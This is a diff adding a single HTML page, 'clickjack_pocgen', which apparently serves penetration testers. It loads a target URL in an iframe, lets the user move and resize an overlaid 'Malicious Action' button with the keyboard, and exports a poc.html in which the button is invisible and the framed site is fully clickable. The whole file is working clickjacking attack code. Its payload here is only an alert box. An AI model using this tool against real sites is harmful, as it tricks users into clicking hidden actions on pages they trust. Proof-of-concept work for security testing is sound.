@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<title>clickjack_pocgen</title>
+<style>
+iframe { 
+    position: absolute;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    border: none;
+    opacity: 0.5;
+    
+    /* Prevents losing focus */
+    pointer-events: none;
+    display:block;
+  }
+  
+  body 
+  {
+    overflow: hidden;
+    margin: 0px;
+    padding: 0px;
+  }
+    
+  #target {
+    position: absolute;
+    width: 100px;
+    height: 100px;
+    
+    top: 10%;
+    left: 10%;
+
+    background: red;
+    color: white;
+    opacity: 0.7;
+    
+    border: 0px;
+  }
+  
+  #navbar {
+    background-color: #444;
+    overflow: hidden;
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+  
+    color: white;
+    display: block;
+    
+    padding-left:20px;
+    display: flex;
+ }
+ 
+  .horiz_allign {
+    position: relative;
+    width: 40%;
+  }
+  
+  .first_horiz_align
+  {
+    position: relative;
+    width: 20%;
+  }
+  
+  input {
+    margin: 3px;
+  }
+ 
+
+</style>
+
+<script>
+// Makes sure body element exists before executing
+document.onreadystatechange = function () {
+  if (document.readyState == "complete") {
+    clickjack();
+  }
+}
+
+
+function clickjack() 
+{
+	button_text.value = "Malicious Action";
+	target.textContent = button_text.value;
+	
+	frame_src_text.value = "https://example.org";
+	page.src = frame_src_text.value;
+	
+	alert_text.value = "Clickjacked!";
+	var alert_text_var = alert_text.value;
+	target.setAttribute("onclick", `alert('${alert_text_var}');`);
+
+	document.onkeydown = intercept_keys;
+
+	/* It would be a constant, but setting it as var 
+	is needed or you get errors on page reloads */ 
+	var adj = 10;
+
+	function intercept_keys(e) 
+	{
+	    var pos_left = target.offsetLeft;
+	    var pos_top = target.offsetTop;
+
+	    /* Prevents clickjacking area resizing while typing */
+            if (document.activeElement.tagName != "INPUT")
+            {
+		    // Modify position
+		    if (e.keyCode == 39) {
+			target.style.left = (parseInt(target.offsetLeft) + adj) + "px";
+		    }
+		    else if (e.keyCode == 37) {
+			target.style.left = (parseInt(target.offsetLeft) - adj) + "px";
+		    } 
+		    else if (e.keyCode == 38) {
+			target.style.top = (parseInt(target.offsetTop) - adj) + "px";
+		    } 
+		    else if (e.keyCode == 40) {
+			target.style.top = (parseInt(target.offsetTop) + adj) + "px";
+		    }
+		    
+		    // Modify size
+		    if (e.keyCode == 87) {
+			target.style.height = (parseInt(target.offsetHeight) - adj) + "px";
+		    }
+		    else if (e.keyCode == 83) {
+			target.style.height = (parseInt(target.offsetHeight) + adj) + "px";
+		    } 
+		    else if (e.keyCode == 65) {
+			target.style.width = (parseInt(target.offsetWidth) - adj) + "px";
+		    } 
+		    else if (e.keyCode == 68) {
+			target.style.width = (parseInt(target.offsetWidth) + adj) + "px";
+		    } 
+	    }
+	    
+	    // Manage navbar toggling
+	    if (e.keyCode == 27) {
+	    	if (navbar.style.display == "none")
+	    	{
+	    		navbar.style.display = "flex";
+	    	}
+	    	else
+	    	{
+			navbar.style.display = "none";
+	    	}
+	    }
+	    
+	    if (event.keyCode == 13) {
+         	if (target.textContent != button_text.value) 
+		{
+			target.textContent = button_text.value;
+		}
+		
+		if (page.src != frame_src_text.value) 
+		{
+			page.src = frame_src_text.value;
+		}
+		
+		if (alert_text_var != alert_text.value) 
+		{
+			alert_text_var = alert_text.value;
+			target.setAttribute("onclick", `alert('${alert_text_var}');`);
+		}
+            }
+	}
+}
+
+function export_poc()
+{
+	
+	// Creates a copy of the DOM with the positioned clickjack area
+	var orig_content = document.documentElement.innerHTML;
+	var dom_copy = _create_dom_clone(orig_content);
+
+	// Makes the clickjack area transparent
+	var target_cloned = dom_copy.getElementById("target");
+	target_cloned.style.opacity = "0%";
+
+	// Restores opacity of the frame and re-enables mouse interactions
+	var frame_cloned = dom_copy.getElementById("page");
+	frame_cloned.style.opacity = "100%";
+	frame_cloned.style['pointer-events']  = "auto";
+
+	// Removes unnecessary elements
+	dom_copy.getElementById("navbar").remove();
+	dom_copy.getElementsByTagName("script")[0].remove()
+
+	// Sets up a dummy download button and clicks it to export the PoC
+	var bl = new File([dom_copy.documentElement.innerHTML], {type: "text/html"});
+	var a = document.createElement("a");
+	a.href = URL.createObjectURL(bl);
+	a.download = "poc.html";
+	a.hidden = true;
+	document.body.appendChild(a);
+	a.innerHTML = "bm90IGFuIGVhc3RlciBlZ2c=";
+
+	a.click(); //download
+}
+
+function _create_dom_clone(htmlcode)
+{
+	var doc = document.implementation.createHTMLDocument('clickjack_pocgen PoC');  
+	doc.documentElement.innerHTML = htmlcode;
+	return doc
+}
+
+</script>
+</head>
+
+<body>
+<iframe id="page" frameBorder=0></iframe>
+
+<button type="button" id="target" onclick=""></button>
+
+<div id="navbar">
+	<div class=first_horiz_align>
+		<h3>Instructions:</h3>
+	</div>
+	<div class=horiz_allign>
+		<p>
+		Press <code>WASD</code> keys to adjust clickjacking area size, <br>
+		Press <code>←↑→↓</code> keys to adjust its position, <br>
+		Press <code>esc</code> key to toggle this navbar, <br>
+		Press <code>enter</code> key to update input data
+		</p>
+	</div>
+	<span class=horiz_allign>
+		<p>
+		Set URL to clickjack here: <input id="frame_src_text" type="text"> <br>
+		Set clickjacking area text here: <input id="button_text" type="text"> <br>
+		Set alert text here: <input id="alert_text" type="text"> <br>
+		Export PoC: <button onclick="export_poc()">PoC of GTFO</button>
+		</p>
+	</span>
+</div>
+
+</body>
+
+</html>
